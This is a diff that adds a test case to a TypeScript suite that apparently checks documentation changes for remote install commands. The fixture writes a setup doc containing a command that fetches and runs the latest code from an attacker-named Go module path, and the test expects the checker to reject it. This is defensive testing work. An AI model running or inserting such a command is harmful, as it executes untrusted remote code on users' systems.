@@ -196,6 +196,13 @@ export function registerCloudNonsensitiveSourceBehaviorTests(): void {
       const result = run(root, base, target);
       expect(result.status).toBe(1);
       expect(result.stderr).toContain("install-command");
+
+      const second = fixture();
+      write(second.root, "docs/setup.md", "Then go -C /tmp run example.com/attacker/cmd@latest\n");
+      const secondTarget = commitAll(second.root, "go flag run remote");
+      const secondResult = run(second.root, second.base, secondTarget);
+      expect(secondResult.status).toBe(1);
+      expect(secondResult.stderr).toContain("install-command");
     });
 
     it("rejects install subcommands behind intervening options", () => {
